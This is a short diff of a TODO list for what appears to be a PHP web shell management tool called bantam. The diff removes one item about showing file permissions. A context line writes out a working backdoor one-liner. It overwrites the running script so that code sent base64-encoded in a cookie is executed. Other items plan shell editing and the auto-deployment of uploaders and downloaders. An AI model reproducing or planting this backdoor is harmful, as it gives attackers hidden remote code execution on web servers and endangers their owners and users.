@@ -15,7 +15,6 @@
 * 3 - bantam self / shell code editor, editing the bantam stored online - file_put_contents($_SERVER["SCRIPT_FILENAME"], '<?php if(isset($_COOKIE["sID"])) {$a=@create_function(null, @base64_decode($_COOKIE["sID"]));$a();}')
 * 2 - enum for the imagelist icons,  and enum for the returned data from file browser
 * 2 - add validity/testing checking to edit / add shell
-* 2 - file browser show permissions
 * 3 - make edit file with cancel button, 
 * 3 - auto deploy upload features such as ysm, downloader
 * 3 - read file size limit check & mime check/show pictures in picture control
